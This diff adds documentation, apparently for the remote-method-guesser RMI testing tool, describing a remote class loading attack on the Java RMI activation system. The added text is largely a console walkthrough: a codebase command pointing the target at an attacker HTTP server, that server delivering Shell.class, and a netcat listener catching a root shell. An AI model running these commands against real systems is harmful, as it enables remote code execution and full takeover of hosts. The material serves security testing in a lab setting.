@@ -66,3 +66,27 @@ Ncat: Connection from 172.17.0.2:41217.
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+Apart from being vulnerable to *deserialization attacks*, the ``activator`` can also be vulnerable to remote class loading attacks.
+For this attack to work, the ``ActivationSystem`` needs to run with ``useCodebaseOnly=false`` and a security policy that allows
+the requested operation. The default implementation for the *activation system* (``rmid``) uses the same *SecurityManager* as the
+*RMI registry*. Therefore, pulling classes from remote is always allowed.
+
+```console
+[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --component act
+[+] Attempting codebase attack on Activator endpoint...
+[+] Using class Shell with codebase http://172.17.0.1:8000/ during activate call.
+
+[qtc@kali www]$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+172.17.0.2 - - [27/Mar/2021 06:31:28] "GET /Shell.class HTTP/1.1" 200 -
+
+[qtc@kali ~]$ nc -vlp 4444
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:36110.
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
